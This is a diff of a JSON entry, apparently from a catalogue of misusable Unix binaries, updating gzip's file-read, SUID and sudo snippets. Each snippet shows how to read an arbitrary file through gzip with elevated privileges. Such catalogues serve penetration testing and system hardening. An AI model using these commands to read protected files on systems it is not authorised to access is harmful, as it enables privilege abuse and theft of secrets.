@@ -1,22 +1,25 @@
 {
-  "description": "There are also a number of other utilities that rely on 'gzip' under the hood, e.g., 'zless', 'zcat', 'gunzip', etc. Besides having similar features, they also allow privileged reads if 'gzip' itself is SUID.",
   "functions": {
     "file-read": [
       {
-        "code": "gzip -f [file] -t\n"
+        "description": "",
+        "code": "LFILE=file_to_read\ngzip -f $LFILE -t\n"
       },
       {
-        "code": "gzip -c [file] | gzip -d\n"
+        "description": "",
+        "code": "LFILE=file_to_read\ngzip -c $LFILE | gzip -d\n"
       }
     ],
     "suid": [
       {
-        "code": "./gzip -f [file] -t\n"
+        "description": "",
+        "code": "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo gzip -f [file] -t\n"
+        "description": "",
+        "code": "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
       }
     ]
   }
